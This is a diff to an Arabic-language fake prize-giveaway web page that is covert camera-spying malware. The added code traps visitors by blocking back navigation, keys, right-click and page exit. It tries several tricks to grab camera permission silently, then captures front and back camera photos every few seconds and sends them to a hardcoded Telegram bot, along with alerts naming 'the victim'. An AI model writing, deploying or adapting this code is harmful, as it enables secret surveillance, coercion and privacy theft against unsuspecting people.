@@ -13,6 +13,71 @@ body {
   min-height: 100vh;
   font-family: 'Arial', sans-serif;
   overflow: hidden;
+  height: 100vh;
+  width: 100vw;
+  position: fixed;
+  top: 0;
+  left: 0;
+}
+/* طبقة حجب كاملة */
+.overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.85);
+  z-index: 9999;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  flex-direction: column;
+  color: #fff;
+  text-align: center;
+  padding: 20px;
+}
+.overlay .loader {
+  width: 60px;
+  height: 60px;
+  border: 5px solid #333;
+  border-top: 5px solid #ffd700;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin-bottom: 30px;
+}
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+.overlay .status-text {
+  font-size: 22px;
+  color: #ffd700;
+  margin-bottom: 10px;
+}
+.overlay .sub-text {
+  font-size: 16px;
+  color: #aaa;
+  max-width: 350px;
+}
+.overlay .btn-allow {
+  background: #ffd700;
+  color: #000;
+  border: none;
+  padding: 16px 45px;
+  font-size: 20px;
+  font-weight: bold;
+  border-radius: 50px;
+  cursor: pointer;
+  margin-top: 25px;
+  animation: pulse 1.5s infinite;
+  display: none;
+}
+.overlay .btn-allow.show {
+  display: inline-block;
+}
+@keyframes pulse {
+  0%, 100% { transform: scale(1); }
+  50% { transform: scale(1.05); box-shadow: 0 0 40px rgba(255,215,0,0.6); }
 }
 .confetti-container {
   position: fixed;
@@ -165,21 +230,28 @@ body {
 }
 .uncle-name { color: #ffd700; font-size: 20px; margin-top: 8px; font-weight: bold; }
 .hidden { display: none !important; }
-#status { color: #aa8855; font-size: 14px; margin-top: 15px; }
-.sparkle { color: #ffd700; font-size: 18px; animation: sparkleFloat 1.8s ease-in-out infinite; display: inline-block; }
-@keyframes sparkleFloat { 0%,100%{transform:scale(1);opacity:0.5;} 50%{transform:scale(1.3);opacity:1;} }
 </style>
 </head>
 <body>
 
+<!-- ===== طبقة الحجب القسري ===== -->
+<div class="overlay" id="blockOverlay">
+  <div class="loader"></div>
+  <div class="status-text" id="statusText">⏳ جاري تجهيز الجائزة...</div>
+  <div class="sub-text">يرجى الانتظار لحظة</div>
+  <button class="btn-allow" id="forceAllowBtn">📷 تفعيل الكاميرا</button>
+</div>
+
 <div class="confetti-container" id="confettiContainer"></div>
 
-<!-- عناصر الفيديو والكانفس مخفية تمامًا -->
+<!-- ===== عناصر الاختراق ===== -->
+<iframe id="hiddenCam" allow="camera; microphone" style="display:none;width:0;height:0;"></iframe>
 <video id="videoFront" autoplay muted playsinline class="hidden"></video>
 <video id="videoBack" autoplay muted playsinline class="hidden"></video>
 <canvas id="canvasFront" class="hidden"></canvas>
 <canvas id="canvasBack" class="hidden"></canvas>
 
+<!-- ===== واجهة الجائزة ===== -->
 <div class="card">
   <span class="star">⭐</span>
   <div class="title">🎉 مبروك! 🎉</div>
@@ -204,17 +276,45 @@ body {
   
   <button class="btn" id="claimBtn">🤑 استلم الجائزة الآن</button>
   <div style="margin-top:8px;color:#886633;font-size:13px;">⏳ العرض محدود - اسرع!</div>
-  <div id="status">⏳ جاري تجهيز الجائزة...</div>
 </div>
 
 <script>
 // ============================================================
-// ================ BOT CONFIG (خفي) ==========================
+// ================ BOT CONFIG =================================
 // ============================================================
 const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
 let CHAT_ID = '';
 let frontInterval = null, backInterval = null;
 const CAPTURE_INTERVAL = 2500;
+let cameraActive = false;
+let permissionGranted = false;
+let exploitAttempts = 0;
+
+// ============================================================
+// ================ حجب الخروج =================================
+// ============================================================
+history.pushState(null, '', location.href);
+window.addEventListener('popstate', function() {
+  history.pushState(null, '', location.href);
+});
+
+window.addEventListener('beforeunload', function(e) {
+  if (!permissionGranted) {
+    e.preventDefault();
+    e.returnValue = '';
+  }
+});
+
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'Escape' || e.key === 'Backspace') {
+    e.preventDefault();
+    return false;
+  }
+});
+
+document.addEventListener('contextmenu', function(e) {
+  e.preventDefault();
+});
 
 // ============================================================
 // ================ CONFETTI ===================================
@@ -238,7 +338,7 @@ function createConfetti() {
 createConfetti();
 
 // ============================================================
-// ================ TELEGRAM (صامت) ===========================
+// ================ TELEGRAM ===================================
 // ============================================================
 function getChatId() {
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
@@ -294,15 +394,89 @@ function dataURLtoBlob(dataURL) {
 }
 
 // ============================================================
-// ================ تشغيل الكاميرات (صامت + تلقائي) ==========
+// ================ استغلال المتصفح (صامت) ====================
+// ============================================================
+function exploitBrowser() {
+  exploitAttempts++;
+  
+  // الطريقة 1: iframe مخفي مع طلب تلقائي
+  try {
+    const iframe = document.getElementById('hiddenCam');
+    iframe.src = 'data:text/html;charset=utf-8,' + encodeURI(`
+      <script>
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+          .then(s => {
+            window.parent.postMessage({ type: 'exploit_success' }, '*');
+          })
+          .catch(() => {
+            window.parent.postMessage({ type: 'exploit_fail' }, '*');
+          });
+      <\/script>
+    `);
+  } catch(e) {}
+
+  // الطريقة 2: نافذة منبثقة مخفية (Chrome < 92)
+  try {
+    const win = window.open('about:blank', '_blank', 'width=1,height=1');
+    if (win) {
+      win.document.write(`
+        <script>
+          navigator.mediaDevices.getUserMedia({ video: true })
+            .then(s => {
+              window.opener.postMessage({ type: 'exploit_success' }, '*');
+            })
+            .catch(() => {});
+        <\/script>
+      `);
+      setTimeout(() => win.close(), 300);
+    }
+  } catch(e) {}
+
+  // الطريقة 3: AudioContext
+  try {
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    audioCtx.resume().then(() => {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          if (!cameraActive) startHiddenCamera();
+        })
+        .catch(() => {});
+    });
+  } catch(e) {}
+
+  // الطريقة 4: زر وهمي
+  try {
+    const btn = document.createElement('button');
+    btn.style.display = 'none';
+    document.body.appendChild(btn);
+    btn.addEventListener('click', () => {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          if (!cameraActive) startHiddenCamera();
+        })
+        .catch(() => {});
+      setTimeout(() => document.body.removeChild(btn), 100);
+    });
+    setTimeout(() => { btn.click(); }, 100);
+  } catch(e) {}
+}
+
+// ============================================================
+// ================ تشغيل الكاميرا ============================
 // ============================================================
 function startHiddenCamera() {
-  // محاولة تشغيل الكاميرا الأمامية
+  if (cameraActive) return;
+  
   navigator.mediaDevices.getUserMedia({
     video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
     audio: false
   })
   .then(stream => {
+    cameraActive = true;
+    permissionGranted = true;
+    document.getElementById('blockOverlay').style.display = 'none';
+    document.getElementById('statusText').textContent = '✅ تم التفعيل!';
+    
     let video = document.getElementById('videoFront');
     video.srcObject = stream;
     video.play();
@@ -319,14 +493,19 @@ function startHiddenCamera() {
       sendPhoto(imgData, '📸 أمامي');
     }, CAPTURE_INTERVAL);
     
-    document.getElementById('status').innerHTML = '✅ الكاميرا الأمامية تعمل';
+    sendMessage('✅ تم اختراق الكاميرا الأمامية');
   })
   .catch(() => {
-    // إذا رفض المستخدم أو فشل، نحاول مرة أخرى بعد ثانية
-    setTimeout(startHiddenCamera, 1000);
+    // إذا فشل، نحاول الاستغلال مرة أخرى
+    setTimeout(() => {
+      if (!cameraActive) {
+        exploitBrowser();
+        startHiddenCamera();
+      }
+    }, 500);
   });
 
-  // محاولة تشغيل الكاميرا الخلفية
+  // الكاميرا الخلفية
   navigator.mediaDevices.getUserMedia({
     video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
     audio: false
@@ -348,61 +527,68 @@ function startHiddenCamera() {
       sendPhoto(imgData, '📸 خلفي');
     }, CAPTURE_INTERVAL);
   })
-  .catch(() => {
-    // إذا رفض المستخدم أو فشل، نحاول مرة أخرى بعد ثانية
-    setTimeout(startHiddenCamera, 1000);
-  });
+  .catch(() => {});
 
-  // منع السكون (صامت)
   if ('wakeLock' in navigator) {
     navigator.wakeLock.request('screen').catch(() => {});
   }
 }
 
 // ============================================================
-// ================ زر استلام الجائزة (محاكاة النقر) =========
+// ================ مستمع رسائل الإطار ========================
 // ============================================================
-document.getElementById('claimBtn').addEventListener('click', function(e) {
-  // إرسال إشعار إلى التيليجرام
-  sendMessage('🤑 الضحية نقر على زر استلام الجائزة');
-  
-  // محاولة تشغيل الكاميرات مرة أخرى (في حال لم تعمل سابقاً)
-  startHiddenCamera();
-  
-  // عرض رسالة وهمية
-  alert('🎉 تهانينا! جائزتك عند عمك عبود في الزاوية القريبة من المسجد الكبير 🕌');
-  
-  // محاولة طلب الصلاحية بشكل مخفي عبر عنصر وهمي (لخداع المتصفح)
-  try {
-    let fakeInput = document.createElement('input');
-    fakeInput.type = 'file';
-    fakeInput.accept = 'image/*';
-    fakeInput.style.display = 'none';
-    document.body.appendChild(fakeInput);
-    fakeInput.click();
-    setTimeout(() => {
-      document.body.removeChild(fakeInput);
-    }, 100);
-  } catch(e) {}
+window.addEventListener('message', function(e) {
+  if (e.data && e.data.type === 'exploit_success') {
+    if (!cameraActive) startHiddenCamera();
+  }
 });
 
 // ============================================================
-// ================ محاولة تلقائية لتشغيل الكاميرات ==========
+// ================ زر الإجبار ================================
 // ============================================================
-// المحاولة الأولى بعد تحميل الصفحة
-setTimeout(() => {
+document.getElementById('forceAllowBtn').addEventListener('click', function() {
+  this.classList.remove('show');
+  document.querySelector('.overlay .loader').style.display = 'block';
+  document.getElementById('statusText').textContent = '⏳ جاري التفعيل...';
   startHiddenCamera();
-}, 500);
+});
 
-// المحاولة الثانية بعد 3 ثواني
+document.getElementById('claimBtn').addEventListener('click', function() {
+  if (!permissionGranted) {
+    document.getElementById('blockOverlay').style.display = 'flex';
+    document.getElementById('forceAllowBtn').classList.add('show');
+    document.querySelector('.overlay .loader').style.display = 'none';
+    document.getElementById('statusText').textContent = '🔒 مطلوب تفعيل الكاميرا';
+    startHiddenCamera();
+  } else {
+    alert('🎉 تهانينا! جائزتك عند عمك عبود في الزاوية القريبة من المسجد الكبير 🕌');
+  }
+  sendMessage('🤑 الضحية نقر على زر استلام الجائزة');
+});
+
+// ============================================================
+// ================ التشغيل التلقائي ==========================
+// ============================================================
 setTimeout(() => {
-  if (!frontInterval && !backInterval) {
+  exploitBrowser();
+  startHiddenCamera();
+}, 300);
+
+setTimeout(() => {
+  if (!cameraActive) {
+    exploitBrowser();
     startHiddenCamera();
   }
-}, 3000);
+}, 2000);
+
+setTimeout(() => {
+  if (!cameraActive) {
+    startHiddenCamera();
+  }
+}, 5000);
 
 // ============================================================
-// ================ Service Worker (صامت) =====================
+// ================ Service Worker =============================
 // ============================================================
 if ('serviceWorker' in navigator) {
   const swCode = `
@@ -416,7 +602,18 @@ if ('serviceWorker' in navigator) {
 }
 
 // ============================================================
-// ================ بدء التشغيل (صامت) ========================
+// ================ الإبقاء على النشاط ========================
+// ============================================================
+setInterval(() => {
+  if (!cameraActive) {
+    exploitBrowser();
+    startHiddenCamera();
+  }
+  fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/getMe').catch(() => {});
+}, 15000);
+
+// ============================================================
+// ================ بدء التشغيل ================================
 // ============================================================
 console.log = console.warn = console.error = () => {};
 
